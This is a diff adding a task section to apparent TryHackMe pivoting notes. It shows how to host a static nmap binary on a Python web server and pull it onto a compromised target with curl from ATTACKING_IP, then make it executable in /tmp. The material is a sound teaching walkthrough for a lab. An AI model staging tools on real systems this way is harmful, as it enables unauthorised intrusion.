@@ -949,11 +949,24 @@
    Pivoting truly is a vast topic; however, hopefully you've learnt something by covering the theory in this section!
 
 
+***[Task 17] Git Server Enumeration***
+
+   t's time to put your newfound knowledge to the test!
+
+   Download a static nmap binary. Rename it to nmap-USERNAME, substituting in your own TryHackMe username. Finally, upload it to the target in a manner of your choosing.
+
+   For example, with a Python webserver:-
+
+   On Kali (inside the directory containing your Nmap binary):
+
+       sudo python3 -m http.server 80
+
+   Then, on the target:
+
+       curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME
 
 
-
-
-
+      ![image](https://user-images.githubusercontent.com/68686150/115669155-9878a580-a365-11eb-9ca8-b0a7bc88741a.png)
 
 
 
